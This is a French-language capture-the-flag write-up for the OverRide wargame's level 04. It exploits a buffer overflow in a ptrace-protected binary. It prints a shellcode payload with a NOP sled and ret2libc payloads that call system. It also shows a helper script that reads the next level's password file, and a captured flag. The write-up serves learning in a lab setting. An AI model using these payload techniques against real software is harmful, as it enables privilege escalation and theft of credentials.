# Level 04

## Introduction

A cause d'une protection via ptrace + fork. On ne peut pas utiliser de shellcode pour exploiter l'overflow mais on peut appeler la fonction système et lui glisser une commande sh à executer.

## Resumé

 1. Décompiler le programme : https://dogbolt.org/?id=d27e3b04-b575-4126-af26-7c135c61096e ;
 2. On a un buffer overflow ;
 3. On appelle system (overflow à 156) avec en argument une commande sh (limité à une dizaine de caractère).


## Etapes

### Tentative 1

(Voir [source.c](../source.c) pour le code complet)

En reprenant mon shellcode "favori" : https://www.exploit-db.com/exploits/13357 

```sh
export ICE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"');
```

```
(gdb) x/20s environ                          	 
0xffffd39c:  	"\331\324\377\377\351\324\377\377
\332\377\377\256\332\377\377\305\332\377\377\324\3
\333\377\377\071\333\377\377I\333\377\377v\333\377
[...] (plein de fois entrée)
0xffffdbb8:  	"ICE=\220\220\220\220\220\220\220
0\220\220\220\220\220\220\220\220\220\220\220\220\
\220\220\220\220\220\220\220\220\220\220\220\220\2
220\220\220\220\220\220\220\220\220\220\220\220\22
20\220\220\220\220\220\220\220\220\220\220\220\220
0\220\220\220\220\220\220\220\220\220\220\220\220\
\220\220\220\220\220\220\220\220\220\220\220\220\2
0xffffdc80:  	"\220\220\220\220\220\220\220\220
0\220\220\220\220\220\220\220\220\220\220\220\220\
\220\220\220\220\220\220\220\220\220\220\220\220\2
220\220\220\220\220\220\220\220\220\220\220\220\22
20\220\220\220\220\220\220\220\220\220\220\220\220
0\220\220\220\220\220\220\220\220\220\220\220\220\
\220\220\220\220\220\220\220\220\220\220\220\220\2
0xffffdd48:  	"\220\220\220\220\220\220\220\220
0\220\220\220\220\220\220\220\220\220\220\220\220\
\220\220\220\220\220\220\220\220\220\220\220\220\2
220\220\220\220\220\220\220\220\220\220\220\220\22
20\220\220\220\220\220\220\220\220\220\220\220\220
0\220\220\220\220\220\220\220\220\220\220\220\220\
\220\220\220\220\220\220\220\220\220\220\220\220\2
0xffffde10:  	"\220\220\220\220\220\220\220\220
```

Ce shellcode fonctionne mais le processus parent audit ce qui se passe au niveau du child. Il détecte excve et kill le process :

```sh
(python -c 'print "a" * 156 + "\x80\xdc\xff\xff"') | ./level04
```
On obtient :
```
level04@OverRide:~$ (python -c 'print "a" * 156 + "\x80\xdc\xff\xff"') | ./level04
Give me some shellcode, k
no exec() for you
```

overflow à 156, car 155 c’est ok, voir ci-dessous `SIGCHLD`.

(J’ai utilisé ptrace car le fork cache le segfault).

```
level04@OverRide:~$ strace ./level04
[...]
wait4(-1, Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Give me some shellcode, k
test
[{WIFSTOPPED(s) && WSTOPSIG(s) == SIGCHLD}], 0, NULL) = 1951
--- SIGCHLD (Child exited) @ 0 (0) ---
ptrace(PTRACE_PEEKUSER, 1951, 8*RBX + 4, [0xffffd28000000072]) = 0
wait4(-1, ^C <unfinished ...>
level04@OverRide:~$ strace ./level04
[...]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 1955
--- SIGCHLD (Child exited) @ 0 (0) ---
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd9000
write(1, "child is exiting...\n", 20child is exiting...
)   = 20
exit_group(0)                       	= ?
level04@OverRide:~$
```

### Tentative 2

On sait que l'overflow se fait à 156.

Methode avec la fonction système.

On récupère l'adresse de la fonction system :

```
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

En essayant de faire system + adresse vers /bin/sh (contenu par ma variable d’environnement), j’ai trouvé que je pouvais juste glissé mon argument dans mon padding.

```
level04@OverRide:~$ (python -c 'print "a" * 156 + "\xd0\xae\xe6\xf7\x80\xdc\xff\xff"' | cat -) | ./level04
Give me some shellcode, k
sh: 1: aaaaaaaaaaaa���0���aaaaaaaa������: not found
```

En essayant de trouver quels `a` sont affichés (en y allant en tâtonnant, en mettant une partie de `b` et de `a`), on apprend que c’est à partir du 80ème qu’on arrive à injecter un argument à system.

```
level04@OverRide:~$ (python -c 'print "b" * 80 + "cat /home/users/level05/.pass > /tmp/lvl5" + "a" * (156 - 80 - 41) + "\xd0\xae\xe6\xf7aaaa"') | ./level04
Give me some shellcode, k
cat: /home/us���0���l05/.pas�����: No such file or directory
^C
```

On est limité à une dizaine de caractères (`cat /home/us`, sachant que le `s` deviendra `;`), en réfléchissant, j'ai réalisé que la solution était simple… Executer un fichier avec une commande (longue) qui sera nommé `/tmp/a` !

```
level04@OverRide:~$ echo "cat /home/users/level05/.pass > /tmp/lvl5" > /tmp/a
level04@OverRide:~$ cat /tmp/a
cat /home/users/level05/.pass > /tmp/lvl5
level04@OverRide:~$ chmod +x /tmp/a
level04@OverRide:~$ (python -c 'print "b" * 80 + "/tmp/a;" + "a" * (156 - 80 - 7) + "\xd0\xae\xe6\xf7aaaa"') | ./level04
Give me some shellcode, k
sh: 1: aaaaa���0���aaaaaaaa������: not found
^C
level04@OverRide:~$ cat /tmp/lvl5
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

Et voilà, on a le flag !
